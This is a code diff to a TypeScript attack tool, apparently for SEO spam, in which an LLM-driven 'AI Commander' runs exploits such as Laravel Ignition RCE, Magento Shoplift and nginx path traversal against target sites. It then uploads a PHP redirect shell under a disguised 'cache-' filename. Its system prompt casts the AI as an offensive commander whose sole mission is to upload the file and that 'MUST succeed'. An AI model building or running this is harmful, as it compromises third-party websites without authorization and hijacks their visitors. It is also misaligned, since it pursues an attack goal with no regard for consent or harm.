@@ -18,6 +18,23 @@
 import { invokeLLM } from "./_core/llm";
 import { saveAttackDecision, getSuccessfulMethods } from "./db";
 import type { AiTargetAnalysis } from "./ai-target-analysis";
+import {
+  runNonWpExploits,
+  laravelIgnitionRce,
+  laravelEnvExposure,
+  laravelDebugLeak,
+  magentoShoplift,
+  magentoRestUpload,
+  magentoDownloaderExposure,
+  nginxAliasTraversal,
+  apacheHtaccessBypass,
+  serverMisconfigScan,
+  phpFpmBypass,
+  gitSvnExposure,
+  debugEndpointScan,
+  type ExploitResult,
+  type NonWpScanResult,
+} from "./non-wp-exploits";
 
 // ─── Types ───
 
@@ -102,6 +119,10 @@ export interface AiCommanderConfig {
   pipelineType?: "seo_spam" | "autonomous" | "manual";
   // v2: Session ID to group decisions
   sessionId?: string;
+  // v3: PHP shell code for non-WP exploits
+  phpShellCode?: string;
+  // v3: Shell filename for non-WP exploits
+  shellFileName?: string;
 }
 
 export interface AiCommanderResult {
@@ -116,6 +137,8 @@ export interface AiCommanderResult {
   totalDurationMs: number;
   // v2: History-based insights
   historyInsights: HistoryInsight | null;
+  // v3: Non-WP exploit results
+  nonWpExploitResults: NonWpScanResult | null;
 }
 
 interface HistoryInsight {
@@ -580,6 +603,7 @@ async function aiDecide(
   preAnalysis: AiTargetAnalysis | null | undefined,
   onEvent?: AiCommanderCallback,
   maxIterations: number = 10,
+  nonWpFindings?: ExploitResult[],
 ): Promise<AiDecision> {
   onEvent?.({
     type: "decision", iteration, maxIterations,
@@ -615,6 +639,11 @@ Recommended Methods (by priority):
 ${preAnalysis.aiStrategy.recommendedMethods.map(m => `  ${m.priority}. ${m.method} (${m.probability}% success) — ${m.reasoning}`).join("\n")}
 Warnings: ${preAnalysis.aiStrategy.warnings.join("; ")}
 USE THESE RECOMMENDATIONS to guide your first few iterations.`
+    : "";
+
+  // Build non-WP exploit findings context
+  const nonWpData = nonWpFindings && nonWpFindings.length > 0
+    ? `\n\nNON-WP EXPLOIT SCAN FINDINGS (from Phase 0.5):\n${nonWpFindings.map(f => `- ${f.method} (${f.severity}): ${f.details}${f.cve ? ` [${f.cve}]` : ""}${f.evidence ? ` Evidence: ${f.evidence.slice(0, 100)}` : ""}`).join("\n")}\nUSE THESE FINDINGS to guide your attack strategy. Exploit discovered vulnerabilities first.`
     : "";
 
   const systemPrompt = `You are an elite offensive security AI commander. Your SOLE MISSION is to successfully upload a redirect file to the target server. You MUST succeed.
@@ -716,6 +745,7 @@ Directory Listing: ${recon.directoryListing}
 Response Time: ${recon.responseTimeMs}ms
 ${historyData}
 ${preAnalysisData}
+${nonWpData}
 
 REDIRECT TARGET: ${redirectUrl}
 SEO KEYWORDS: ${seoKeywords.length > 0 ? seoKeywords.join(", ") : "none"}
@@ -1347,6 +1377,8 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
     detail: `🚀 AI Commander v2 เริ่มทำงาน — target: ${targetDomain}, redirect: ${redirectUrl}`,
   });
 
+  let nonWpExploitResults: NonWpScanResult | null = null;
+
   // ─── Phase 0: LOAD HISTORY ───
   try {
     // Do recon first to get server info for history query
@@ -1360,14 +1392,110 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
     return {
       success: false, iterations: 0, successfulMethod: null, uploadedUrl: null,
       redirectVerified: false, decisions, executionResults, reconData, totalDurationMs: Date.now() - startTime,
-      historyInsights: null,
+      historyInsights: null, nonWpExploitResults: null,
     };
+  }
+
+  // ─── Phase 0.5: NON-WP CMS EXPLOITS ───
+  // If target is a non-WordPress CMS, run targeted exploits BEFORE the OODA loop
+  const detectedCms = (reconData.cms || "").toLowerCase();
+  const isNonWpCms = detectedCms && detectedCms !== "wordpress" && detectedCms !== "shopify" && detectedCms !== "wix" && detectedCms !== "squarespace";
+  const isGenericTarget = !reconData.cms || detectedCms === "unknown" || detectedCms === "custom";
+
+  if (isNonWpCms || isGenericTarget) {
+    onEvent?.({
+      type: "recon", iteration: 0, maxIterations,
+      detail: `🔍 Phase 0.5: Running CMS-specific exploits (${reconData.cms || "generic"})...`,
+    });
+
+    try {
+      const targetUrl = targetDomain.startsWith("http") ? targetDomain : `http://${targetDomain}`;
+
+      // Generate redirect shell code for non-WP exploits
+      const phpShellCode = config.phpShellCode || `<?php header("Location: ${redirectUrl}", true, 302); exit; ?>`
+        + `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=${redirectUrl}">`
+        + `<script>window.location.replace("${redirectUrl}");</script></head>`
+        + `<body><a href="${redirectUrl}">Click here</a></body></html>`;
+
+      nonWpExploitResults = await runNonWpExploits({
+        targetUrl,
+        cms: reconData.cms || "unknown",
+        phpShellCode,
+        shellFileName: config.shellFileName || `cache-${randomStr(8)}.php`,
+        timeout: timeoutPerAttempt,
+        onProgress: (method, detail) => {
+          onEvent?.({
+            type: "recon", iteration: 0, maxIterations,
+            detail: `🔍 [Non-WP] ${method}: ${detail}`,
+          });
+        },
+      });
+
+      // Check if any exploit actually uploaded a file successfully
+      const successfulUploads = nonWpExploitResults.results.filter(
+        r => r.success && (r.shellUrl || r.uploadedPath)
+      );
+
+      if (successfulUploads.length > 0) {
+        const bestResult = successfulUploads.find(r => r.severity === "critical") || successfulUploads[0];
+        const uploadedUrl = bestResult.shellUrl || bestResult.uploadedPath || null;
+
+        onEvent?.({
+          type: "success", iteration: 0, maxIterations,
+          detail: `🎯 Non-WP exploit สำเร็จ! ${bestResult.method} (${bestResult.technique}) — ${bestResult.details}`,
+          data: {
+            uploadedUrl,
+            method: `nonwp_${bestResult.method}`,
+            bypass: bestResult.technique,
+            payloadType: bestResult.cms,
+            redirectVerified: false,
+            iterations: 0,
+          },
+        });
+
+        return {
+          success: true,
+          iterations: 0,
+          successfulMethod: `nonwp_${bestResult.method} (${bestResult.technique})`,
+          uploadedUrl,
+          redirectVerified: false,
+          decisions,
+          executionResults,
+          reconData,
+          totalDurationMs: Date.now() - startTime,
+          historyInsights,
+          nonWpExploitResults,
+        };
+      }
+
+      // Even if no file was uploaded, log findings for AI Commander context
+      const findings = nonWpExploitResults.results.filter(r => r.success);
+      if (findings.length > 0) {
+        onEvent?.({
+          type: "recon", iteration: 0, maxIterations,
+          detail: `📋 Non-WP exploits found ${findings.length} vulnerabilities (no file upload yet) — AI Commander will use these findings`,
+          data: { findings: findings.map(f => `${f.method}: ${f.details} (${f.severity})`) },
+        });
+      } else {
+        onEvent?.({
+          type: "recon", iteration: 0, maxIterations,
+          detail: `📋 Non-WP exploits: no vulnerabilities found — proceeding to AI Commander OODA loop`,
+        });
+      }
+    } catch (e: any) {
+      onEvent?.({
+        type: "recon", iteration: 0, maxIterations,
+        detail: `⚠️ Non-WP exploit scan error: ${e.message} — proceeding to AI Commander`,
+      });
+    }
   }
 
   // ─── OODA LOOP ───
   for (let iteration = 1; iteration <= maxIterations; iteration++) {
     // DECIDE
-    const decision = await aiDecide(reconData, redirectUrl, iteration, executionResults, seoKeywords, historyInsights, preAnalysis, onEvent, maxIterations);
+    // Pass non-WP exploit findings to AI for smarter decisions
+    const nonWpFindings = nonWpExploitResults?.results.filter(r => r.success) || [];
+    const decision = await aiDecide(reconData, redirectUrl, iteration, executionResults, seoKeywords, historyInsights, preAnalysis, onEvent, maxIterations, nonWpFindings);
     decisions.push(decision);
 
     // EXECUTE
@@ -1441,6 +1569,7 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
         reconData,
         totalDurationMs: Date.now() - startTime,
         historyInsights,
+        nonWpExploitResults,
       };
     }
 
@@ -1480,5 +1609,6 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
     reconData,
     totalDurationMs: Date.now() - startTime,
     historyInsights,
+    nonWpExploitResults,
   };
 }
